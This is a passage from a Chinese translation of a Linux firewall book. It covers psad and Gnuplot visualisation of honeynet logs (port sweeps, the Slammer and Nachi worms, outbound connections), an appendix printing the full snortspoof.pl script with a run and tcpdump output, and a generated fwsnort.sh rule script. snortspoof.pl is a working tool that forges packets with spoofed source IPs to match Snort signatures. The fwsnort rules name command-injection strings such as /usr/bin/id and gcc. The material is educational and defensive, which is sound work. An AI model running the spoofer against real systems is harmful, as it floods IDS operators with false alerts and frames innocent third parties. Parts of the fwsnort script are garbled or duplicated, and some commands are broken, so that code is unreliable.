如图 14-5 所示，大多数外部地址（x 轴）向一个或两个目的地址发送数据包（在 y 轴上计数）。然而，有几个外部地址连接到蜜罐网络（honeynet）中的多达 24 个地址。对于代表大约 18000 到 26000 范围的外部地址来说尤其如此。`fig14-5.dat` 文件（可以从 [`www.cipherdyne.org/linuxfirewalls`](http://www.cipherdyne.org/linuxfirewalls) 下载）显示，18000 到 26000 的 IP 地址范围对应于 `iptables` 数据集中的 63.236.244.77 到约 221.140.82.123。

Scan34 `iptables` 数据集某些源反复尝试连接到目标系统范围内的特定端口。图 14-6 绘制了从外部源地址到目的端口的数据包数量。该图是三维的，因此 x 轴表示源地址，y 轴显示端口号，z 轴是数据包计数。（注意 `psad` 命令行上的 `--gnuplot-3d` 参数）。

```
 # psad -m iptables.data --gnuplot --CSV-fields src:not11.11.0.0/16 dp:count  --gnuplot
-graph points --gnuplot-3d --gnuplot-view 74,77 --gnuplot-file-prefix fig14-6
$ gnuplot fig14-6.gnu
```

![外部源地址与目的端口及数据包计数](img/atomatomoreillycomsourcenostarchimages207424.png)

图 14-6. 外部源地址与目的端口及数据包计数

在小于 10000 的端口（y 轴）上超过 2000 个数据包（z 轴）的离群值显示在源地址与目的端口的常规平面之上（该平面上的常规计数小于 500）。我们可以通过查看 `fig14-6.dat` 文件发现，该点对应于 IP 地址 200.216.205.189，它向 TCP 端口 3306 (MySQL) 发送了总计 2244 个数据包：

```
 22315, 3306, 2244  ### 22315=200.216.205.189
```

这看起来确实是一个端口扫描器（port sweeper）。事实上，图 14-7 所示的图表说明，源 IP 地址 200.216.205.189 连接到 11.11.0.0/16 子网中许多目的地址上的端口 3306（我们在下方将后续图限制为加粗的源 IP 地址 200.216.205.189）：

```
 # psad -m iptables.data --gnuplot --CSV-fields "dst dp:3306,count" --CSV-regex "SRC=
200.216.205.189" --gnuplot-graph points --gnuplot-yrange 0:150 --gnuplot-file-prefix
fig14-7
$ gnuplot fig14-7.gnu
```

图 14-7 中的图显示了 IP 地址 200.216.205.189 向目的地址（x 轴）的 TCP 端口 3306 发送的数据包数量（y 轴）。端口扫描共涉及 24 个目的地址，在某些系统上，向端口 3306 发送了超过 120 个数据包。

![MySQL 3306 端口扫描](img/atomatomoreillycomsourcenostarchimages20732.png)

图 14-7. MySQL 3306 端口扫描

可视化上述信息的另一种方法是使用 `Afterglow` 生成链接图。此类图包含可见格式的源和目的 IP 地址，并显示了从 IP 地址 200.216.205.189 到 11.11.0.0/16 子网中几个目的地的系列数据包：

```
 # psad  -m iptables.data --CSV --CSV-fields "src:200.216.205.189 dp:3306" --CSV-
max 6 | perl afterglow.pl -c color.nf | neato -Tpng -o fig14-8.png
```

`psad` 对 `Afterglow` 的接口产生了图 14-8 所示的链接图。（参见上述 `psad` 的 `--CSV-max` 参数，用于限制数据点为六个以提高可读性。）

![MySQL 端口扫描链接图](img/atomatomoreillycomsourcenostarchimages20742.png)

图 14-8. MySQL 端口扫描链接图

## Slammer 蠕虫

Slammer（或称 Sapphire）蠕虫是历史上传播速度最快的蠕虫之一。它利用了 Microsoft SQL Server 2000 的栈溢出漏洞，并通过单个 404 字节的数据包（包括 IP 头部）发送到端口 1434。在你的 `iptables` 日志中可以很容易识别 Slammer 蠕虫：指向 UDP 端口 1434 的数据包且 `LEN` 字段为 404。`psad` 签名集包含 `CUSTOM Slammer communication` 签名，当蠕虫命中你的某个系统时提醒你。让我们看看 Slammer 蠕虫是否从外部源对蜜罐进行了攻击：

```
 # psad -m iptables.data --gnuplot --CSV-fields "timestamp dp1434,counthour" --gnuplot
-graph lines --gnuplot-xrange 1140887484:1143867180 --CSV-regex "LEN=404.*PROTO=UDP"
```

```
`gnuplot` 产生了图 14-9 所示的线条图（注意 `--CSV-regex` 命令行中的 `LEN=404` 参数，因为 Scan34 数据中有其他指向端口 1434 的 UDP 数据包，但它们不是 Slammer 蠕虫，因为数据包长度不是 404 字节）。

```
 --gnu-file-prefix fig14-9
```

![Slammer 蠕虫按小时的数据包计数](img/atomatomoreillycomsourostarchimages20741.png)

图 14-9. Slammer 蠕虫按小时的数据包计数

事实上，Slammer 蠕虫对蜜罐是活跃的，3 月 20 日的峰值显示每小时约 57 个数据包。这是一个大量的活动，但当我们更改时间尺度时会发生什么？按分钟查看 Slammer 的活动（注意此时 `psad` 使用了 `countmin` ）：

```
 # psad -m iptables.data --gnuplot --CSV-fields "timestamp dp1434,countmin"
--gnuplot-graph lines --gnuplot-xrange 1140887484:1143867180 --CSV-regex "LEN=404.*
PROTO=UDP"
--CSV-neg-regex "SRC=11.11." --gnuplot-file-prefix fig14-10
$ gnuplot fig14-10
```

现在，Slammer 蠕虫的图 14-10 看起来并不那么像图 14-9 中的尖锐峰值那样糟糕，但这仅仅是因为时间尺度发生了变化。感染 Slammer 蠕虫的系统数据包数量没有变化，但在 3 月 21 日 Scan34 覆盖的期间建立了四个数据包的最大值。

![Slammer 蠕虫按分钟的数据包计数](img/atomatomoreillycomsourostarchimages20740.png)

图 14-10. Slammer 蠕虫按分钟的数据包计数

## Nachi 蠕虫

Nachi 蠕虫攻击未修复 MS03-026 漏洞的 Microsoft Windows 2000 和 XP 系统（`MS03-026` 字符串指的是微软漏洞编号）。该蠕虫的一个关键特征是在尝试入侵系统之前，它先用一个 92 字节的 ICMP 请求数据包 ping 目标。这个特定长度为 92 字节的初始 ICMP 数据包使得 Nachi 蠕虫易于检测。要绘制 Scan34 `iptables` 数据集的 Nachi 蠕虫流量，你可以在 `psad` 的 `--CSV-fields` 参数中使用 `ip_len:92` 标准，并将检查限制为源自 11.11.0.0/16 子网的 ICMP 数据包：

```
 # psad -m iptables.data --gnuplot --CSV-fields "timestamp ip_len:92,counthour"
--gnuplot-graph lines --gnuplot-xrange 1140887484:1143867180 --CSV-regex "PROTO=ICMP"
--CSV
-neg-regex "SRC=11.11." --gnuplot-file-prefix fig14-11
$ gnuplot fig14-11.png
```





果然，在 3 月 19 日 Nachi 蠕虫活动出现了一次高峰，在图 14-11 所示的 Gnuplot 图中可以很容易看出。

![每小时 Nachi 蠕虫流量](img/httpatomoreillycomsourcenostarchimages207396.png)

图 14-11. 每小时 Nachi 蠕虫流量

蠕虫流量的链路图非常引注目，因为有大量的外部 IP 地址向本地子网发送可疑数据包。由 `AfterGlow` 生成的链路图（所示图 14-12）展示了 Nachi 蠕虫 ICMP 流量正聚集攻击蜜网系统。92 字节的 IP `LEN` 字段显示为图中正中间的小圆圈，外部 IP 地址显示为椭圆，而蜜网地址显示为矩形：

```
 # psad -m iptables.data --CSV --CSV-fields "src dst ip_len:92" --CSV-max 300 --CSV
-regex "PROTO=ICMP.*TYPE=8" | perl afterglow.pl -c color.nf |neato -Tpng -o fig14-12.png
```

## 从受损系统的出站连接

将蜜网系统置于开放的互联网上，是希望它们能被攻破。分析成功的攻击以及导致实际攻破的步骤，是学习如何保护你的系统以及获取潜在新漏洞有价值情报的最佳方法。除了我们已经讨论过的端口扫描、端口遍历和蠕虫活动外，我们还可以使用 `iptables` 数据来判断是否有蜜网系统向外部 IP 地址发了出站连接。

![Nachi 蠕虫 92 字节 ICMP 数据包链路图](img/httpatomoreillycomsourcenostarchimages207370.png)

图 14-12. Nachi 蠕虫 92 字节 ICMP 数据包链路图

当蜜网到外部 SSH 和 IRC 服务器的连接无法通过预期的管理通信来解释时，这些连接尤为可疑，并且是蜜网系统已被攻破的强有力指标。同样，如果你注意到你管理的系统出现了出站的 SSH 或 IRC 连接，且对此类连接没有合理、合法的解释，那么可能需要进行深度分析。

为了绘制出从蜜网 `11.11.0.0/16` 子网到外部地址目标端口的所有出站 SYN 数据包，我们执行以下命令：

```
 # psad -m iptables.data --gnuplot --CSV-fields "src:11.11.0.0/16 dst:not11.11.0.0/16 dp" --CSV-regex "SYN URGP=" --gnuplot-graph points  --gnuplot-file-prefix fig14-13 --gnuplot-view 71,63
$ gnuplot fig14-13.png
```

`Gnuplot` 生成了所示图 14-13。（请注意上方加粗的 **"SYN URGP="** 匹配准则，它匹配 `iptables` 日志消息中 TCP 标志部分的 SYN 标志。）

![蜜网出站连接的点状图](img/httpatomoreillycomsourcenostarchimages207388.png)

图 14-13. 蜜网出站连接的点状图

图 14-13 中的图表显示了从蜜网单个源地址（由 x 轴上的数字 1 表示）到多个外部地址（由 y 轴 0 到 45 的范围表示）的一系列 SYN 数据包。每个 SYN 数据包的目标端口显示在 z 轴上。如你所见，有几个指向 0–1000 范围内低端口的数据包，还有几个指向 6000–7000 范围内高端口的数据包。这可能是可疑的，但我们需要知道具体的目标端口以便做出更知情的判断。为此，我们转向具有相同搜索参数的链路图：

```
 # psad -m iptables.data --CSV --CSV-fields "src:11.11.0.0/16 dst:not11.11.0.0/16 dp" --CSV-regex "SYN URGP=" | perl afterglow.pl -c color.nf | neato -Tpng -o fig14-14.png
```

`AfterGlow` 生成了所示图 14-14。

![蜜网出站连接的链路图](img/httpatomoreillycomsourcenostarchimages207451.png)

图 14-14. 蜜网出站连接的链路图

图 14-14 中的链路图比图 14-13 的相同数据更容易判断发生了什么。我们看到蜜网正在向外部 IP 地址建立 TCP 连接。源 IP 地址是 11.11.79，在链路图中显示为椭圆。所有的矩形都是外部 IP 地址。

# 结语

安全数据的可视化表示可以快速传达重要信息，而这些信息可能需要耗费大量分析才能获取，而且对于需要筛选数据的人来说，这无疑是幸事。通过从安全数据中提取字段并绘制图表，往往可以得出趣味性的结论。对于 `iptables` 数据，`psad` 提供了从日志中提取字段的手段，而 `Gnuplot` 和 `AfterGlow` 项目让这些数据栩如生。

## 附录 A. 欺骗攻击

如果入侵检测系统（IDS）有一个共同点，那就是它们会产生误报——有时会为明显并非恶意的流量发送告报。调整 IDS 是减少误报负载的要求，但即使是调整最精细的 IDS 也会将正常流量误认为恶意。这为攻击者创造了机会。如果攻击者能够故意制造在 IDS 看来是恶意的网络流量，那么可能也可以向 IDS 隐藏攻击（或监控 IDS 告报的人员）。

* *

² 许多管理员拥有从网络各个点收集的 PCAP 原始数据包文件。尽管 `psad` 目前尚未解析这些文件，但你可以使用 `tcreplay` 工具（参见 [`tcreplay.synfin.net`](http://tcreplay.synfin.net)）将这些数据包发送到 `iptables` 防火墙，以便 `iptables` 记录数据包，供 `psad`、`Gnuplot` 和 `AfterGlow` 渲染。这个想法是在与 Richard Bejtlich 的邮件通信中被建议的。




此外，攻击者可以通过从由该第三方拥有的 IP 地址向 IDS 发起伪造攻击，从而以此陷害一个无辜的第三方；IDS 适配员可能很难区分伪造攻击和真实攻击。本附录稍后出现的 `snortspoof.pl` 脚本将向你展示如何创建针对 Snort IDS 的此类虚假流量；在讨论该脚本时，我们还将涵盖 Snort 为缓解此类攻击而采用的对策措施。

## 连接跟踪 (Connection Tracking)

如在 第 9 章 中提到的，Snort 添加了 `stream4` 预处理器以应对伪造的 TCP 攻击；它会跟踪 TCP 会话的状态，并忽略未通过已建立的会话发送的攻击。从攻击者的角度来看，生成看起来像恶意的流量的最佳方法是解析 IDS 使用的签名集，并构造具有与这些签名匹配的伪造源 IP 地址的数据包。

这正是以下 Perl 脚本（`snortspoof.pl`）对 Snort IDS 规则集所做的。（该脚本随 `fwsnort` 项目发布，也可以从 [`www.cipherdyne.org/linuxfirewalls`](http://www.cipherdyne.org/linuxfirewalls) 下载。）`snortspoof.pl` 脚本的设计目的是为了说明使用 Perl 构建 Snort 在没有流预处理器的情况下识别为恶意的 IP 数据包是多么简单。然而，此脚本并不是用于生成匹配所有 Snort 规则流量的完整性程序。某些 Snort 规则包含对应用层数据的复杂描述（在某些情况下使用 `pcre` 关键字指定了正则表达式，例如），而 `snortspoof.pl` 尚未处理此类复杂性。

```
 [spoofer]$ cat snortspoof.pl
#!/usr/bin/perl -w

❶ require Net::RawIP;
use strict;

my $file       = $ARGV[0] || '';
my $spoof_addr = $ARGV[1] || '';
my $dst_addr   = $ARGV[2] || '';

die "$0 <rules file> <spoof IP> <dst IP>"
    unless $file and $spoof_addr and $dst_addr;

# alert udp $EXTERNAL_NET any -> $HOME_NET 635 (msg:"EXPLOIT x86 Linux # mountd
overflow"; content:"^|B0 02 89 06 FE C8 89|F|04 B0 06 89|F";
### reference:bugtraq,121
my $sig_sent = 0;
❷ open F, "< $file" or die "[*] Could not open $file: $!";
SIG: while (<F>) {
    my $content = '';
    my $conv_content = '';
    my $hex_mode = 0;
    my $proto = '';
    my $spt = 10000;
    my $dpt = 10000;

    ### make sure it is an inbound sig
❸     if (/^\s*alert\s+(tcp|udp)\s+\S+\s+(\S+)\s+\S+
            \s+(\$HOME_NET|any)\s+(\S+)\s/x) {
        $proto = $1;
        my $spt_tmp = $2;
        my $dpt_tmp = $4;

        ### can't handle multiple content fields yet
        next SIG if /content:.*\s*content\:/;

        $content = $1 if /\s*content\:\"(.*?)\"\;/;
        next SIG unless $content;

        if ($spt_tmp =˜ /(\d+)/) {
            $spt = $1;
        } elsif ($spt_tmp ne 'any') {
            next SIG;
        }
        if ($dpt_tmp =˜ /(\d+)/) {
            $dpt = $1;
        } elsif ($dpt_tmp ne 'any') {
            next SIG;
        }

        my @chars = split //, $content;
❹         for (my $i=0; $i<=$#chars; $i++) {
            if ($chars[$i] eq '|') {
                $hex_mode == 0 ? ($hex_mode = 1) : ($hex_mode = 0);
                next;
            }
            if ($hex_mode) {
                next if $chars[$i] eq ' ';
                $conv_content .= sprintf("%c",
                        hex($chars[$i] . $chars[$i+1]));
                $i++;
            } else {
                $conv_content .= $chars[$i];
            }
        }
        my $rawpkt = '';
        if ($proto eq 'tcp') {
❺            $rawpkt = new Net::RawIP({'ip' => {
                saddr => $spoof_addr, daddr => $dst_addr},
                'tcp' => { source => $spt, dest => $dpt, 'ack' => 1,
                data => $conv_content}})
                    or die "[*] Could not get Net::RawIP object: $!";
        } else {
❻            $rawpkt = new Net::RawIP({'ip' => {
                saddr => $spoof_addr, daddr => $dst_addr},
                'udp' => { source => $spt, dest => $dpt,
                data => $conv_content}})
                    or die "[*] Could not get Net::RawIP object: $!";
        }
❼         $rawpkt->send();
        $sig_sent++;
    }
}
print "[+] $file, $sig_sent attacks sent.\n";
close F;
exit 0;
```

深入源码，在 ❶ 处，脚本使用了 `Net::RawIP` Perl 模块，该模块必须在你的系统上安装。（你可以从 [`www.cpan.org`](http://www.cpan.org) 下载它。）在 ❷ 处，打开命令行给出的 Snort 规则文件，脚本遍历文件中的所有规则。在 ❸ 处，`snortspoof.pl` 提取检测针对 `HOME_NET` 攻击的 TCP 和 UDP 签名；我们想要发送那些远程 Snort 传感器正在寻找的进入 `HOME_NET` 的攻击。

代码中最复杂的部分始于 ❹ 处——解释 Snort 规则试图在网络流量中匹配的应用层内容字符串。如果原始内容字段包含包含在管道符号（`|`）字符之间的十六进制代码，`snortspoof.pl` 在攻击数据包放入网线之前将这些字符转换为字节。在 ❺ 和 ❻ 处，`snortspoof.pl` 使用 `Net::RawIP` Perl 模块构建 TCP 或 UDP 数据包，使用命令行指定的源目的地址以及源自 Snort 规则的应用层数据。最后，在 ❼ 处，数据包发送到目标 IP。

现在是时候使用 `snortspoof.pl` 针对 `exploit.rules` 文件中包含的签名伪造 IP 地址。

## 伪造 exploit.rules 流量 (Spoofing exploit.rules)

你可以按照以下方式执行 `snortspoof.pl` 来伪造 `exploit.rules` 文件中的攻击包（使其看起来来自 IP 地址 11.11.22.22），并将它们发送到目标 IP 地址 44.44.55.55：

```
 [spoofer]#  snortspoof.pl /etc/fwsnort/exploit.rules 11.11.22.22 44.44.55
[+] /etc/fwsnort/exploit.rules, 53 attacks sent.
```

使用 `tcpdump`，我们可以确认 `snortspoof.pl` 正如所述运行运行并对目标 IP 生成了攻击。以下示例显示了 Snort 规则 315 `EXPLOIT x86 Linux mountd` 通过 UDP 发送：

```
 [spoofer]#  tcpdump -i eth1 -l -nn -s 0 -X -c 1 port 635
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
23:32:08.563668 IP 11.11.22.22.10000 > 44.44.55.55.635: UDP, length 14
     0x0000:  4510 002a 0000 4000 4011 b62f 0b0b 1616  E..*...@../....
     0x0010:  c0a8 0a03 2710 027b 0016 90cf 5eb0 0289  ....'..{.......
     0x0020:  06fe c889 4604 b006 8946                 ....F....F
1 packets captured
2 packets received by filter
0 packets dropped by kernel
```




本附录讨论了攻击者如何尝试利用 Snort 规则集作为创建恶意流量的指南，从而强制 Snort 产生误报事件。`snortspoof.pl` 脚本通过解析 Snort 规则集并使用原始套字（raw sockets）向目标 IP 地址发送匹配的流量来实现这一自动化。尽管 `snortspoof.pl` 仅适用于 Snort IDS，但类似的策略也可以适用于任何使用签名检测可疑流量的 IDS；你只需要一个签名集副本以及经过稍作修改的 `snortspoof.pl` 版本即可。

## 伪造 UDP 攻击

许多入侵检测系统采用的一种防御措施是跟踪 TCP 连接的状态，并仅对通过已会话传输的攻击发送警报。这对于通过 UDP 发送的攻击是无效的，除非采用基于时间的机制来同时跟踪客户端发送的所有数据包以及任何相应的服务器响应。以这种方式跟踪 UDP 通信可以允许 IDS 对模拟恶意服务器响应的伪造攻击发送警报，但它无法解决来自 UDP 客户端的伪造攻击，因为此类流量并不需要双向通信。`Snort-2.6.1` 包含一个增强的 `stream5` 预处理器，并支持 UDP，因此伪造 UDP 服务器响应对 Snort 的效果已经降低。总的来说，解析 IDS 的签名集并在网络上进行伪造，是测试任何 IDS 可能提供的连接跟踪能力的一种良好方法。

# 附录 B. 完整的 FWSNORT 脚本

在本附录中，你将找到一个完整的 `fwsnort.sh` 脚本示例；它是由 `fwsnort` 根据 `web-attacks.rules` 文件中的七条不同的 Snort 规则生成的。这些规则通过规则 ID `1332`、`1336`、`1338`、`1339`、`1341`、`1342` 和 `1360` 标识，旨在检测 Web 客户端通过 Web 服务器执行某些命令（通常是通过一个接受用户输入并由 Web 服务器执行的 CGI 程序）。这些命令在 Linux 系统上很常见，包括 `gcc` 编译器、`nc` (Netcat)、`chown`、C shell `chsh` 以及 `id`（用于查询分配给当前用户的 UID 和 GID 值）。Web 客户端任何强制 Web 服务器执行这些命令的严重尝试都可能是可疑的。

要创建 `fwsnort.sh` 脚本并使其包含上述七条 Snort 规则的 `iptables` 命令，请如下所示执行 `fwsnort`：

```
[iptablesfw]# fwsnort --snort-sid 1332,1336,1338,1339,1341,1342,1360
[+] Parsing Snort rules files...
[+] Found sid: 1332 in web-attacks.rules
    Successful translation.
[+] Found sid: 1336 in web-attacks.rules
    Successful translation.
[+] Found sid: 1338 in web-attacks.rules
    Successful translation.
...
[+] Logfile:         /var/log/fwsnort.log
[+] Iptables script: /etc/fwsnort/fwsnort.sh
```

上面的输出表明 Snort 规则已正确转换为 `iptables` 规则（部分输出已省略），且 `fwsnort.sh` 脚本存在于 `/etc/fwsnort` 目录。下方以其完整、未省略的形式显示。





```bash
[iptablesfw]# cat /etc/fwsnort/fwsnort.sh
#!/bin/sh
#
########################################################################
#
# 文件:  /etc/fwsnort/fwsnort.sh
#
# 用:  此脚本由 fwsnort 自动生成，并基于 Snort 规则实现
#           iptables 规则集。更多信息请参阅
#           fwsnort man 页面或访问 http://www.cipherdyne.org/fwsnort 的可用文档。
#
# ❶ # 生成自: fwsnort --snort-sid 1332,1336,1338,1339,1341,1342,1360
# 生成于主机:  iptablesfw
# 生成时间:       Wed Jul 18 18:26:19 2007
#
# 生成于主机: iptables
#
# 作者:  Michael Rash <mbr@cipherdyne.org>
#
# 版本: 1.0 (文件修订版本: 381)
########################################################################
#

#==================== 配置 ====================
`ECHO`=/bin/echo
`IPTABLES`=/sbin/iptables
#================== 配置结束 ==================
###
############ 创建 fwsnort iptables 链。 ############
###
❷ `$IPTABLES` -N FWSNORT_FORWARD 2> /dev/null
`IPTABLES` -F FWSNORT_FORWARD
`IPTABLES` -N FWSNORT_FORWARD_ESTAB 2> /dev/null
`IPTABLES` -F FWSNORT_FORWARD_ESTAB
`IPTABLES` -N FWSNORT_INPUT 2> /dev/null
`IPTABLES` -F FWSNORT_INPUT
`IPTABLES` -N FWSNORT_INPUT_ESTAB 2> /dev/null
`IPTABLES` -F FWSNORT_INPUT_ESTAB
`IPTABLES` -N FWSNORT_OUTPUT 2> /dev/null
`IPTABLES` -F FWSNORT_OUTPUT
`IPTABLES` -N FWSNORT_OUTPUT_ESTAB 2> /dev/null
`IPTABLES` -F FWSNORT_OUTPUT_ESTAB
###
############ 检查已建立（ESTABLISHED）的 tcp 连接。 ############
###
❸ `$IPTABLES` -A FWSNORT_FORWARD -p tcp -m state --state ESTABLISHED -j FWSNORT_FORWARD_
ESTAB
`IPTABLES` -A FWSNORT_INPUT -p tcp -m state --state ESTABLISHED -j FWSNORT_INPUT_ESTAB
`IPTABLES` -A FWSNORT_OUTPUT -p tcp -m state --state ESTABLISHED -j FWSNORT_OUTPUT_
ESTAB
###
############ web-attacks.rules ############
###
### alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:"WEB-ATTACKS /usr/
bin/id command attempt"; flow:to_server,established;  content:"/usr/bin/id"; nocase;
classtype:web-application-attack; sid:
1332; rev:5;)
❹ `$IPTABLES` -A FWSNORT_FORWARD_ESTAB -d 192.168.10.0/24 -p tcp --dport 80 -m string
--string "/usr/bin/id " --algo bm -m comment --comment "msg: WEB-ATTACKS /usr/bin/id
command attempt; classtype: web-application-attack; rev: 5; FWS:0.9.0;" -j LOG --log-
ip-
options --log-tcp-options --log-prefix "[1] SID1332 ESTAB "
`IPTABLES` -A FWSNORT_INPUT_ESTAB -p tcp --dport 80 -m string --string  "/usr/bin/id"
--algo bm -m comment --comment "msg: WEB-ATTACKS /usr/bin/id command attempt;
classtype:
web-application-attack; rev: 5; FWS:0.9.0;" -j LOG --log-ip-options --log-tcp-options
--log-prefix "[1] SID1332 ESTAB "
### alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:"WEB-ATTACKS chmod
command attempt"; flow:to_server,established; content:"/bin/chmod"; nocase; classtype:
web-application-attack; sid:1336; rev:5;)
`IPTABLES` -A FWSNORT_FORWARD_ESTAB -d 192.168.10.0/24 -p tcp --dport 80 -m string
--string "/bin/chmod" --algo bm -m comment --comment "msg: WEB-ATTACKS chmod command
attempt; classtype: web-application-attack; rev: 5; FWS:0.9.0;" -j LOG --log-ip-
options --log
-tcp-options --log-prefix "[2] SID1336 ESTAB "
`IPTABLES` -A FWSNORT_INPUT_ESTAB -p tcp --dport 80 -m string --string  "/bin/chmod"
--algo bm -m comment --comment "msg: WEB-ATTACKS chmod command attempt; classtype:
web-
application-attack; rev: 5; FWS:0.9.0;" -j LOG  --log-ip-options --log-tcp-options
--log
-prefix "[2] SID1336 ESTAB "
### alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:"WEB-ATTACKS chown
command attempt"; flow:to_server,established; content:"/chown"; nocase; classtype:web-
application-attack; sid:1338; rev:6;)
`IPTABLES` -A FWSNORT_FORWARD_ESTAB -d 192.168.10.0/24 -p tcp --dport 80 -m string
--string "/chown" --algo bm -m comment --comment "msg: WEB-ATTACKS chown command
attempt;
classtype: web-application-attack; rev:6; FWS:0.9.0;" -j LOG --log-ip-options
--log-tcp-
options -log-prefix "[3] SID1338 ESTAB "
`IPTABLES` -A FWSNORT_INPUT_ESTAB -p tcp --dport 80 -m string --string "/chown"
--algo bm -m comment --comment "msg: WEB-ATTACKS chown command attempt;
classtype: web-application-attack; rev: 6; FWS:0.9.0;" -j LOG --log-ip-options
--log-tcp-options
--log-prefix "[3] SID1338 ESTAB "
### alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:"WEB-ATTACKS chsh
command attempt"; flow:to_server,established; content:"/usr/bin/chsh"; nocase;
classtype:web-application-attack; sid:1339; rev:5;)
`IPTABLES` -A FWSNORT_FORWARD_ESTAB -d 192.168.10.0/24 -p tcp --dport 80 -m string
--string "/usr/bin/chsh" --algo bm -m comment --comment "msg: WEB-ATTACKS chsh
attempt; classtype: web-application-attack; rev: 5; FWS:0.9.0;" -j LOG --log-ip-options
--log-tcp-options --log-prefix "[4] SID1339 ESTAB "
`IPTABLES` -A FWSNORT_INPUT_ESTAB -p tcp --dport 80 -m string --string "/usr/bin/chsh"
--algo bm -m comment --comment "msg: WEB-ATTACKS chsh attempt; classtype: web-application-attack; rev: 5; FWS:0.9.0;" -j LOG  --log-ip-options --log-tcp-options
--log-prefix "[4] SID1339 ESTAB "
### alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:"WEB-ATTACKS /usr/bin/gcc
command attempt"; flow:to_server,established; content:"/usr/bin/gcc"; nocase;
classtype:web-application-attack; sid:1341; rev:5;)
`IPTABLES` -A FWSNORT_FORWARD_ESTAB -d 192.168.10.0/24 -p tcp --dport 80 -m string
--string "/usr/bin/gcc" --algo bm -m comment --comment "msg:
-ATT
 /usr/bin/

command;
classtype: web-application-attack; rev: 5; FWS:0.9.0;" -j- --log----
-----5-1341 "
`IPTABLES` -A FWSNORT_INPUT_ESTAB -p tcp --dport 80 -m string --string "/usr/bin/gcc"
--algo bm -m comment --comment "msg: WEB-ATTACKS /usr/bin/gcc command attempt;
classtype: web-application-attack; rev: 5; FWS:0.9.0;" -j LOG --log-ip-options
--log-5511141 "
### alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:"WEB-ATTACKS chmod
command attempt"; flow:to_server,established; content:"/bin/chmod"; nocase; classtype:
web-application-attack; sid:1336; rev:5;)
`IPTABLES` -A FWSNORT_FORWARD_ESTAB -d 192.168.10.0/24 -p tcp --dport 80 -m string
--string "/bin/chmod" --algo bm -m comment --comment "msg: WEB-ATTACKS chmod command
attempt; classtype: web-application-attack; rev: 5; FWS:0.9.0;" -j LOG --log-ip-
options --log
-tcp-options --log-prefix "[2] SID1336 ESTAB "
`IPTABLES` -A FWSNORT_INPUT_ESTAB -p tcp --dport 80 -m string --string  "/bin/chmod"
--algo bm -m comment --comment "msg: WEB-ATTACKS chmod command attempt; classtype:
web-
application-attack; rev: 5; FWS:0.9.0;" -j LOG  --log-ip-options --log-tcp-options
--log
-prefix "[2] SID1336 ESTAB "
### alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:"WEB-ATTACKS chown
command attempt"; flow:to_server,established; content:"/chown"; nocase; classtype:web-
application-attack; sid:1338; rev:6;)
`IPTABLES` -A FWSNORT_FORWARD_ESTAB -d 192.168.10.0/24 -p tcp --dport 80 -m string
--string "/chown" --algo bm -m comment --comment "msg: WEB-ATTACKS chown command
attempt;
classtype: web-application-attack; rev:6; FWS:0.9.0;" -j LOG --log-ip-options
--log-tcp-
options -log-prefix "[3] SID1338 ESTAB "
`IPTABLES` -A FWSNORT_INPUT_ESTAB -p tcp --dport 80 -m string --string "/chown"
--algo bm -m comment --comment "msg: WEB-ATTACKS chown command attempt;
classtype: web-application-attack; rev: 6; FWS:0.9.0;" -j LOG --log-ip-options
--log-tcp-options
--log-prefix "[3] SID1338 ESTAB "
### alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:"WEB-ATTACKS chsh
command attempt"; flow:to_server,established; content:"/usr/bin/chsh"; nocase;
classtype:web-application-attack; sid:1339; rev:5;)
`IPTABLES` -A FWSNORT_FORWARD_ESTAB -d 192.168.10.0/24 -p tcp --dport 80 -m string
--string "/usr/bin/chsh" --algo bm -m comment --comment "msg: WEB-ATTACKS chsh
attempt; classtype: web-application-attack; rev: 5; FWS:0.9.0;" -j LOG --log-ip-options
--log-tcp-options --log-prefix "[4] SID1339 ESTAB "
`IPTABLES` -A FWSNORT_INPUT_ESTAB -p tcp --dport 80 -m string --string "/usr/bin/chsh"
--algo bm -m comment --comment "msg: WEB-ATTACKS chsh attempt; classtype: web-application-attack; rev: 5; FWS:0.9.0;" -j LOG  --log-ip-options --log-tcp-options
--log-prefix "[4] SID1339 ESTAB "
### alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:"WEB-ATTACKS /usr/bin/gcc
command attempt"; flow:to_server,established; content:"/usr/bin/gcc"; nocase;
classtype:web-application-attack; sid:1341; rev:5;)
`IPTABLES` -A FWSNORT_FORWARD_ESTAB -d 192.168.10.0/24 -p tcp --dport 80 -m string
--string "/usr/bin/gcc" --algo bm -m comment --comment "msg: WEB-ATTACKS /usr/bin/gcc
command attempt; classtype: web-application-attack; rev: 5; FWS:0.9.0;" -j LOG --log-ip-options
--log-tcp-options --log-prefix "[5] SID1341 ESTAB "
`IPTABLES` -A FWSNORT_INPUT_ESTAB -p tcp --dport 80 -m string --string "/usr/bin/gcc"
--algo bm -m comment --comment "msg: WEB-ATTACKS /usr/bin/gcc command attempt;
classtype: web-application-attack; rev: 5; FWS:0.9.0;" -j LOG --log-ip-options --log-tcp-options
--log-prefix "[5] SID1341 ESTAB "
`ECHO` "    已添加规则: 14"
###
############ 将流量跳转到 fwsnort 链。 ############
###
❺ `$IPTABLES` -D FORWARD -i ! lo -j FWSNORT_FORWARD 2> /dev/null
`IPTABLES` -I FORWARD 1 -i ! lo -j FWSNORT_FORWARD
`IPTABLES` -D INPUT -i ! lo -j FWSNORT_INPUT 2> /dev/null
`IPTABLES` -I INPUT 1 -i ! lo -j FWSNORT_INPUT
`IPTABLES` -D OUTPUT -o ! lo -j FWSNORT_OUTPUT 2> /dev/null
`IPTABLES` -I OUTPUT 1 -o ! lo -j FWSNORT_OUTPUT

### EOF ###
```




